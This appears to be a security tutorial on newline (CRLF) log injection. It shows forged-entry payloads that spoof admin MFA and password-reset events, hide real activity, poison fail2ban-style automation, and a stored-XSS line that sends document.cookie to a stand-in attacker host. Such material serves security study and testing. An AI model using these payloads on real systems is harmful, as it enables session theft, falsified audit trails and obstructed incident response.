---
title: "Newline forging in text logs: fabricating log lines and spoofing the record"
description: Exploiting line-oriented logs that embed untrusted input, injecting CRLF to forge whole entries, spoof severity and timestamps, hide real events, poison grep/SIEM pipelines, and reach stored XSS in log viewers.
keywords:
  - log injection
  - log forging
  - newline injection
  - CRLF injection
  - log viewer XSS
  - CWE-117
---

# Newline forging in text logs

A line-oriented log is a stream of records separated by newlines: one event, one line. That convention is the entire security boundary. When an application concatenates untrusted input into a log message and the input carries a newline (`\n`, `0x0A`) or carriage-return/line-feed pair (`\r\n`, `0x0D0A`), a **single** logged event becomes **two or more** lines. Everything that reads the log afterward, a human, a `grep` filter, a SIEM parser, a log-shipping agent, treats each line as a separate, genuine record. The attacker is no longer a subject of the log; they are an author of it.

## Overview

A representative sink logs a user-controlled value verbatim:

```python
# username comes straight from the login form
log.info("Failed login for user: " + username)
```

The author pictures one tidy line. Supplying a `username` of

```
nobody\n2026-10-01 09:14:12 INFO  Login succeeded for user: admin
```

produces two lines in the file, the real failure, and a fabricated success that looks exactly like every legitimate entry around it. Nothing distinguishes the forged line from a real one, because format-wise it *is* a real one: the log format never defended its own record boundary.

The vulnerability is a data-to-structure crossing. The newline is the log's control character, and the attacker supplies it.

## The primitives

Newline forging gives several independent capabilities, all stemming from control of the line boundary and other control bytes.

| Primitive | Injected bytes | Effect |
|-----------|----------------|--------|
| Line split | `\n` / `\r\n` | End the current record, begin a new attacker-authored one |
| Severity spoof | `\n…ERROR …` / `…INFO …` | Forge a line whose level prefix the pattern layout would stamp, raise false alarms or mask activity |
| Timestamp/field spoof | a plausible `<date> <level> <logger>` prefix | Make the forged line indistinguishable from the appender's real output |
| Carriage-return overwrite | lone `\r` | On a terminal, return the cursor to column 0 so following text overwrites the real line in `cat`/`tail` |
| ANSI/control bytes | `\x1b[2K`, `\x07`, backspaces | Erase lines, hide text, or ring/garble a terminal that renders raw log bytes |

Two details sharpen weaponization:

- **Match the layout.** If you know the appender's pattern (`%d %-5level %logger - %msg`), prefix your forged line with a string that reproduces it. The forged record then survives field-based parsing, not just a casual read.
- **Encoding of the newline.** Depending on where the value enters, the newline may need to be literal, percent-encoded in a URL (`%0a`, `%0d%0a`), `\n` in a JSON body that the framework unescapes, or a template escape, the byte that lands in the log string is what matters, not its wire form.

## Injection contexts

Where the field sits in the line changes what a forged record can impersonate:

- **Leading field** (e.g. the logged username is near the start of the line): a single `\n` plus a full fake prefix lets you forge an arbitrary, well-formed event.
- **Trailing field** (the value is the last thing logged): you append new lines freely; the real line is left intact above, and your forged lines follow as "later" events.
- **Mid-line field**: you split the real record in two and your injected prefix begins the second half, useful for truncating an incriminating line so the tail (the part that would record *your* request) lands on a new line that automation ignores.

## Exploitation

### Confirming the split

Register or submit a value containing an encoded newline and a distinctive marker, then read the log:

```
canary%0a2026-10-01 00:00:00 INFO  CANARY-SPLIT-7f3a
```

If `CANARY-SPLIT-7f3a` appears at the start of its own line, rather than inline after `canary`, the newline survived into the log and the sink forges lines. A lone `%0d` with following text confirms carriage-return overwrite behavior in whatever viewer the operator uses.

### Forging authoritative events

With a split confirmed, reproduce the appender's own prefix to mint records that pass for genuine:

```
x%0a2026-10-01 09:14:12 INFO  [auth] password reset completed for admin by system
x%0a2026-10-01 09:14:13 WARN  [auth] mfa disabled for admin (operator request)
```

These are planted to mislead an incident responder reading the timeline, or to manufacture a plausible but false narrative, actions attributed to accounts that never took them, at times that never occurred.

### Hiding real activity

The inverse of forging is burying. Two techniques:

- **Noise flooding.** Inject many newline-separated junk lines around the action you want ignored, so the real entry is one line among thousands and keyword searches return unusably large result sets.
- **Overwrite and truncation.** A lone `\r` followed by spaces causes a naive `tail -f`/`cat` on a terminal to redraw over the genuine line; a mid-line split can push the incriminating remainder of a record onto a new line whose prefix no parser is keyed to.

### Poisoning log-driven automation

Operators and agents parse logs with brittle tools. A forged line crafted to match a `grep`/`awk` field pattern can inject values those scripts act on, feeding a fake IP into a `fail2ban`-style blocklist to trigger denial of service against a chosen address, or a fake field into a shell pipeline that unquotes it. The forged **record structure**, not shell metacharacters, is the payload here.

### Reaching stored XSS in the log viewer

The highest-value downstream sink is the **web-based log console** (a bespoke admin page, or a dashboard that renders raw log text into HTML). Because the viewer displays attacker-influenced bytes, a forged field that carries markup becomes **stored XSS** that executes in the reviewer's browser, frequently a privileged operator:

```
guest%0a2026-10-01 09:20:00 INFO  ua=<script>fetch('//oob.attacker.example/'+document.cookie)</script>
```

If the console emits the line without HTML-encoding, the script runs when an administrator opens the logs, turning a passive log read into session theft or action-on-behalf, entirely out of band from the original request. The newline is what makes the payload a *standalone, plausible* line rather than an obvious inline anomaly.

## Control-character and terminal tradecraft

Beyond `\n`/`\r`, raw logs opened in a terminal interpret other C0 bytes and escape sequences. ANSI erase-line (`\x1b[2K`) and cursor-movement sequences can blank or reposition output; `\x08` (backspace) and `\x7f` can mangle what `cat` shows; `\x07` rings the bell. Where a viewer or `less -R` renders these, they extend line forging into selective concealment of adjacent real records. The applicability depends entirely on how the operator reads the file, which is itself worth enumerating during an engagement.

## Tools

- **[Burp Suite](https://portswigger.net/burp)** (Repeater/Intruder) to inject `%0a`/`%0d%0a` and marker payloads into every logged parameter and header.
- **A controlled log sink** (a staging appender, `tail -f`, or the application's own log viewer) to observe how forged bytes render across consumers.
- **[CyberChef](https://gchq.github.io/CyberChef/)** for encoding newline and control-byte payloads to match each entry point (URL, JSON, form).

## References

- [OWASP: Log Injection](https://owasp.org/www-community/attacks/Log_Injection)
- [CWE-117: Improper Output Neutralization for Logs](https://cwe.mitre.org/data/definitions/117.html)
- [CWE-93: Improper Neutralization of CRLF Sequences (CRLF Injection)](https://cwe.mitre.org/data/definitions/93.html)
- [OWASP Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)
